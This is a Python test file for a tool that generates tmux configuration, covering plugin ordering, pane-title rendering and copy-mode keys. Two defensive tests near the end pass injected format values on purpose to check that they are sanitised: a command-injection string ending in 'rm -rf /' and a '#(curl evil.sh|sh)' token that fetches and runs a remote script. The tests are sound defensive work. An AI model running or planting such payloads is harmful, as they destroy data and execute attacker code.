def test_login_shell_deterministic_across_separate_plans_under_different_shell(
    fake_agent_tools, tmp_path, monkeypatch
):
    """THE real apply→status path (review P1): `apply` and `status` each REBUILD a fresh plan. Two
    independently-built plans under DIFFERENT $SHELL must bake the SAME shell, so a
    `SHELL=/bin/bash rig apply` followed by `SHELL=/usr/bin/fish rig status` does NOT flap drift."""
    from riglib.actions.tmux import tmux_plan_from_action

    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    monkeypatch.setenv("SHELL", "/bin/bash")
    plan_apply = _build({"tmux": {"enabled": True}}, tmp_path, fake_agent_tools)
    a_apply = next(act for act in plan_apply.actions if act.kind == "provision_tmux")
    render_apply = tmux_plan_from_action(a_apply).render_rig_conf()
    # a SEPARATE plan rebuild (as `rig status` does) under a DIFFERENT $SHELL.
    monkeypatch.setenv("SHELL", "/usr/bin/fish")
    plan_status = _build({"tmux": {"enabled": True}}, tmp_path, fake_agent_tools)
    a_status = next(act for act in plan_status.actions if act.kind == "provision_tmux")
    render_status = tmux_plan_from_action(a_status).render_rig_conf()
    line_apply = next(ln for ln in render_apply.splitlines() if "default-command" in ln)
    line_status = next(ln for ln in render_status.splitlines() if "default-command" in ln)
    assert line_apply == line_status  # identical despite the two different ambient $SHELLs


def test_render_ordering_continuum_hook_is_last_plugin_init():
    """THE root-cause guarantee: continuum's run-shell init comes AFTER the Moshi status-right
    tweak (and after resurrect), so the Moshi tweak can never wipe continuum's autosave hook.
    """
    conf = tmux.build_tmux(repo_home=Path("/home/u"), moshi={"enabled": True}).render_rig_conf()
    lines = conf.splitlines()
    continuum_init = next(i for i, ln in enumerate(lines) if "continuum.tmux" in ln)
    # the Moshi status-right wipe, if emitted, must be BEFORE continuum init.
    moshi_idx = [i for i, ln in enumerate(lines) if "status-right ''" in ln or 'status-right ""' in ln]
    assert moshi_idx, "moshi enabled → a status-right tweak must be emitted"
    assert all(i < continuum_init for i in moshi_idx), (
        "every Moshi status-right wipe must precede continuum init so the autosave hook survives"
    )
    # resurrect init also precedes continuum (continuum depends on resurrect being loaded).
    resurrect_init = next(i for i, ln in enumerate(lines) if "resurrect.tmux" in ln)
    assert resurrect_init < continuum_init


def test_render_moshi_off_omits_status_right_wipe():
    """Moshi tweaks are a SEPARATE opt-in toggle — off by default they emit no status-right ''
    of their OWN. pane_titles (default-on, a different feature) also clears status-right, so it
    must be disabled here to isolate what THIS test asserts."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), moshi={"enabled": False}, pane_titles={"enabled": False}
    ).render_rig_conf()
    assert "status-right ''" not in conf and 'status-right ""' not in conf


# ── pane_titles rendering ──────────────────────────────────────────────────────────────────
def test_render_pane_titles_default_on_top_no_date():
    """Default (no `pane_titles:` block at all): pane-border-status is TOP, a pane-border-format
    is emitted, and it carries no date/time strftime token — the exact waste Alex flagged."""
    conf = _plan().render_rig_conf()
    assert "set -g pane-border-status top" in conf
    assert "pane-border-format" in conf
    fmt_line = next(ln for ln in conf.splitlines() if "pane-border-format" in ln)
    assert "%d" not in fmt_line and "%b" not in fmt_line and "%y" not in fmt_line and "%H" not in fmt_line


def test_render_pane_titles_clears_default_clock_date_status_right():
    """tmux's built-in status-right default (`%H:%M %d-%b-%y`) is wasted space once the pane
    title carries context — pane_titles (default-on) clears it unconditionally, not just under
    Moshi's $MOSHI_CLIENT guard."""
    conf = _plan().render_rig_conf()
    assert "set -g status-right ''" in conf


def test_render_pane_titles_configurable_position():
    conf = tmux.build_tmux(repo_home=Path("/home/u"), pane_titles={"position": "bottom"}).render_rig_conf()
    assert "set -g pane-border-status bottom" in conf
    assert "set -g pane-border-status top" not in conf


def test_render_pane_titles_configurable_format():
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), pane_titles={"format": "#{pane_index}: #{pane_title}"}
    ).render_rig_conf()
    assert 'pane-border-format "#{pane_index}: #{pane_title}"' in conf


def test_render_pane_titles_disabled_omits_everything():
    conf = tmux.build_tmux(repo_home=Path("/home/u"), pane_titles={"enabled": False}).render_rig_conf()
    assert "pane-border-status" not in conf
    assert "pane-border-format" not in conf
    assert "status-right ''" not in conf


def test_render_pane_titles_before_continuum_init():
    """Same ordering constraint as the Moshi tweak: the status-right clear must land BEFORE
    continuum's run-shell init, or continuum's own status-right autosave hook would be wiped."""
    conf = _plan().render_rig_conf()
    lines = conf.splitlines()
    pane_titles_idx = next(i for i, ln in enumerate(lines) if "status-right ''" in ln)
    continuum_init = next(i for i, ln in enumerate(lines) if "continuum.tmux" in ln)
    assert pane_titles_idx < continuum_init


def test_render_pane_titles_clear_status_right_is_a_separate_toggle_from_enabled():
    """`clear_status_right: false` keeps a border title WITHOUT wiping an existing custom
    status-right (review: the two must not be fused into one undifferentiated boolean — this is
    a SEPARATE toggle nested under `enabled`, not fully independent of it; see the next test for
    the `enabled: false` side)."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), pane_titles={"clear_status_right": False}
    ).render_rig_conf()
    assert "set -g pane-border-status top" in conf  # the title is still on
    assert "status-right ''" not in conf  # but status-right is left alone


def test_render_pane_titles_enabled_false_makes_clear_status_right_moot():
    """`enabled: false` disables the whole feature even if `clear_status_right` is left true —
    there is no border title without `enabled`, so nothing should touch status-right either."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), pane_titles={"enabled": False, "clear_status_right": True}
    ).render_rig_conf()
    assert "status-right ''" not in conf
    assert "pane-border-status" not in conf


def test_render_pane_titles_moshi_and_clear_status_right_both_before_continuum():
    """With BOTH pane_titles.clear_status_right and moshi enabled, two `status-right ''` lines
    are emitted (the unconditional one and the Moshi $MOSHI_CLIENT-guarded one) — EVERY one of
    them must precede continuum init, not just the first (review: an assertion picking only the
    first match would miss a regression that reordered the second)."""
    conf = tmux.build_tmux(repo_home=Path("/home/u"), moshi={"enabled": True}).render_rig_conf()
    lines = conf.splitlines()
    status_right_idxs = [i for i, ln in enumerate(lines) if "status-right ''" in ln]
    assert len(status_right_idxs) == 2
    continuum_init = next(i for i, ln in enumerate(lines) if "continuum.tmux" in ln)
    assert all(i < continuum_init for i in status_right_idxs)


# ── pane_titles defense-in-depth (build_tmux must not trust a replayed/unvalidated dict) ──────
def test_build_tmux_clamps_invalid_position_instead_of_rendering_garbage():
    """`tmux_plan_from_action` rebuilds a plan straight from stored `Action.options`, bypassing
    `config.validate` entirely (drift checks, a replayed plan, a direct caller). An invalid
    `position` must be clamped to the default rather than rendered verbatim — an unknown-value
    `set -g pane-border-status <x>` would make tmux abort parsing the rest of the config."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), pane_titles={"position": "sideways"}
    ).render_rig_conf()
    assert "set -g pane-border-status top" in conf
    assert "sideways" not in conf


def test_build_tmux_falls_back_to_default_format_on_unsafe_input():
    """Same defense-in-depth as position: an unsafe `format` (one `config.validate` would have
    rejected) must fall back to the safe default at render time, not be interpolated verbatim."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), pane_titles={"format": '#{pane_title}"; rm -rf /'}
    ).render_rig_conf()
    fmt_line = next(ln for ln in conf.splitlines() if "pane-border-format" in ln)
    assert "rm -rf" not in fmt_line


def test_build_tmux_falls_back_to_default_format_on_shell_exec_token():
    """`#(...)` is tmux's own shell-exec format token — a bypass of `config.validate` carrying
    one must not reach the renderer verbatim (the highest-severity input class: RCE, not just
    corruption)."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), pane_titles={"format": "#{pane_title} #(curl evil.sh|sh)"}
    ).render_rig_conf()
    fmt_line = next(ln for ln in conf.splitlines() if "pane-border-format" in ln)
    assert "#(" not in fmt_line
    assert tmux.DEFAULT_PANE_TITLES_FORMAT in fmt_line


def test_render_pane_titles_empty_format_renders_empty_pane_border_format():
    """`format: ""` passes validation (it's safe, just degenerate) and renders verbatim."""
    conf = tmux.build_tmux(repo_home=Path("/home/u"), pane_titles={"format": ""}).render_rig_conf()
    assert 'pane-border-format ""' in conf


# ── copy-mode key table rendering (independent of clipboard) ───────────────────────────────
def test_render_mode_keys_default_vi():
    """mode-keys defaults to vi (Alex tg#325): absent a `tmux.copy_mode` block, the generated
    conf must use the vi copy-mode table (`Space`/`v`-style selection), the root cause of a
    vi-style copy-mode hotkey silently doing nothing under tmux's own emacs default."""
    plan = _plan()
    assert plan.mode_keys == "vi"
    conf = plan.render_rig_conf()
    assert "setw -g mode-keys vi" in conf


def test_render_mode_keys_emacs_is_explicit():
    """An explicit `emacs` override renders verbatim — explicit-every-apply, same contract as
    every other modeled tmux option (never omit-when-default)."""
    conf = tmux.build_tmux(
        repo_home=Path("/home/u"), copy_mode={"mode_keys": "emacs"}
    ).render_rig_conf()
    assert "setw -g mode-keys emacs" in conf
    assert "setw -g mode-keys vi" not in conf


def test_resolve_mode_keys_clamps_invalid_value():
    """A garbage `mode_keys` (bypassing config.validate — a replayed Action.options or a direct
    build_tmux caller) must clamp to the default, not render an unknown-value tmux directive
    that would abort the whole generated conf."""
    plan = tmux.build_tmux(repo_home=Path("/home/u"), copy_mode={"mode_keys": "nonsense"})
    assert plan.mode_keys == "vi"
    conf = plan.render_rig_conf()
    assert "nonsense" not in conf
    assert "setw -g mode-keys vi" in conf
